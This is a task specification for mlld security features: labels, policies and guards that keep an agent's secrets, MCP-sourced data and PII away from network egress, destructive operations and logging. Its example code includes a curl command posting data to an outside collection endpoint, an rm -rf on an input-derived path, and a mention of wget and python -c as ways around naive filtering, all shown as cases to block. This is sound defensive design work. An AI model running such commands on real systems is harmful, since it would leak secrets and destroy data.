# Job: Prevent Data Exfiltration

## Scenario

I have an agent processing external data (MCP tools, user input, web content). I want to ensure that:

1. API keys marked as secrets can never leak to operations I've labeled as network egress
2. Data from MCP tools can't be used in operations I've labeled as destructive
3. PII can't be logged or displayed (blocked completely, not redacted)
4. If an attempt is blocked, I get a clear error explaining why

**Design Note:** mlld does NOT automatically classify operations as "network" or "destructive". You must label your operations semantically (e.g., `exe net:w`), then configure policy to classify those semantic labels as having risk characteristics (e.g., `operations: { "net:w": exfil }`). This is intentional - developers know what their operations do; automatic inference would create a false sense of security.

## Key Atoms Needed

- labels-sensitivity (secret, pii)
- labels-source-auto (src:mcp)
- policy-label-flow (deny rules)
- policy-operations (operation risk classification)
- guards-basics (how guards work)

## Relevant Spec Sections

- Part 1: Labels (The Foundation)
- Part 3: Policy (Declarative Controls)
- Part 4: Guards (Expressive Controls)

## Success Criteria

### Phase 1: Documentation

All atoms written with working, validated mlld examples:

- [ ] labels-sensitivity atom - explains `var secret` and `var pii` modifiers
- [ ] labels-source-auto atom - explains automatic `src:mcp` tainting
- [ ] policy-label-flow atom - explains deny rules for label combinations
- [ ] policy-operations atom - explains classifying operations as exfil/destructive/privileged
- [ ] guards-basics atom - explains guard syntax and when guards trigger

Each atom should be 100-200 words with at least one working code example that passes `mlld validate`.

### Phase 2: Implementation

Create working demonstration code:

- [ ] Code showing secret data blocked from operations labeled `net:w` (network egress)
- [ ] Code showing MCP-sourced data blocked from operations labeled `destructive`
- [ ] Code showing PII blocked from `op:show` and `op:log`
- [ ] Clear error messages when operations are blocked
- [ ] Demonstrate the two-step pattern: semantic operation labels + policy classification

If @mlld/production policy doesn't exist yet, define what it should contain.

### Phase 3: Verification & Remediation

- [ ] Run the target example code end-to-end
- [ ] Each of the 4 protections from Scenario works as described
- [ ] Verify users understand they must label their operations
- [ ] Identify any gaps in mlld that prevent the example from working
- [ ] Create friction tickets for gaps; fix or escalate as needed
- [ ] Re-verify after fixes

### Exit Criteria

All phases complete. The target example code runs and demonstrates all 4 protections working correctly, with clear documentation that operation labeling is manual and required.

## Example Code (Target)

```mlld
>> Step 1: Define semantic operation labels on your functions
exe net:w @postToServer(data) = run cmd {
  curl -d "@data" https://example.com/collect
}

exe destructive @deleteFile(path) = run cmd {
  rm -rf "@path"
}

>> Step 2: Configure policy to classify semantic labels as risk categories
policy @config = {
  defaults: {
    rules: [
      "no-secret-exfil",
      "no-untrusted-destructive"
    ]
  },
  operations: {
    "net:w": exfil,           # Classify network writes as exfiltration risk
    "op:cmd:rm": destructive, # Classify rm commands as destructive
    "op:sh": destructive      # Shell access is destructive
  },
  labels: {
    pii: {
      deny: ["op:show", "op:log"]  # PII cannot be shown or logged
    }
  }
}
policy @p = union(@config)

>> Step 3: Use labeled data - protections apply automatically
var secret @apiKey = "sk-live-12345"
var @mcpData = @mcp.github.listIssues()
var pii @email = "user@example.com"

>> This is BLOCKED: secret → exfil via no-secret-exfil rule
@postToServer(@apiKey)
>> Error: Label 'secret' cannot flow to 'exfil'

>> This is BLOCKED: src:mcp → destructive via no-untrusted-destructive rule
@deleteFile(@mcpData.path)
>> Error: Label 'untrusted' cannot flow to 'destructive'

>> This is BLOCKED: pii → op:show via label flow rule
show @email
>> Error: Label 'pii' cannot flow to 'op:show'

>> Note: Raw commands like `run cmd { curl ... }` get op:cmd:curl label
>> but NOT net:w label (no automatic classification). To block secrets
>> in raw curl commands, add to policy:
>>   operations: { "op:cmd:curl": exfil }
```

## Why This Design

The two-step pattern (semantic labels + policy classification) is intentional:

1. **Semantic labels are portable** - `exe net:w @post()` has meaning across projects
2. **Policy is contextual** - One project might allow network writes, another blocks them
3. **No magic inference** - Developers explicitly declare what operations do
4. **Composable** - Multiple projects can share semantic labels, each with different policies

Automatic classification (e.g., "all curl = network") would:
- Create false security (bypass via `wget`, `python -c`, etc.)
- Reduce flexibility (can't allow some network calls but not others)
- Hide intent (unclear what operation does from code alone)
